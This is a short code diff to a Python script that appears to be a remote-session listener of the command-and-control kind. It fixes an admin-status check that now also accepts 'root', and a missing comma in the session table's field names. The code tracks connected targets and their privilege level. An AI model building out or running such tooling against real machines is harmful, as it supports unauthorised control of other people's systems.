@@ -41,7 +41,9 @@ def message_handler():
             remote_target, remote_ip = sock.accept()
             username = remote_target.recv(1024).decode()
             admin = remote_target.recv(1024).decode()
-            if admin == 1:
+            if admin == '1':
+                isAdmin = 'Yes'
+            elif admin == 'root':
                 isAdmin = 'Yes'
             else:
                 isAdmin = 'No'
@@ -107,7 +109,7 @@ if __name__ == '__main__':
                 session_counter = 1
                 if command.split(' ')[1] == '-l':
                     table = PrettyTable()
-                    table.field_names = ['Session', 'Status', 'Username', 'Admin'
+                    table.field_names = ['Session', 'Status', 'Username', 'Admin',
                                          'Target', 'Connection Time']
                     table.padding_width = 2
                     for target in sessions:
